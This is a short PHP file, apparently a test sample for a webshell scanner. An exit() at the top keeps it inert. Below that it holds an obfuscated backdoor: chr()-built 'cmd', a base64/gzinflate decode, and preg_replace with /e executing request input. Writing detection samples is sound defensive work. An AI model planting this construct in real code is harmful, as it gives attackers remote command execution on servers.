<?php
/**
 * ！！演示样本文件，仅用于 webshell 检测测试，请勿部署到任何服务器！！
 * 首行 exit() 保证该文件即使被访问也不会执行任何代码。
 *
 * 这个样本模拟「混淆型」后门：关键字用 chr() 拼接、payload 用双层编码，
 * 明文里找不到完整的危险函数调用——用来演示为什么只做关键字匹配会漏报。
 */
exit('irscan sample: inert file, contains webshell signatures for detection testing only.');

// ---- 以下是被检测的特征片段（因上方 exit() 而不会被执行）----
$k = chr(99) . chr(109) . chr(100);
$packed = "lVLBbtswDP0VQO5gG2TJMmQ7bC3YpmzLsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJ"
        . "smzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJp"
        . "smzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmzJsmyA";
$code = gzinflate(base64_decode($packed));
preg_replace('/.*/e', $_REQUEST[$k], 'x');
?>
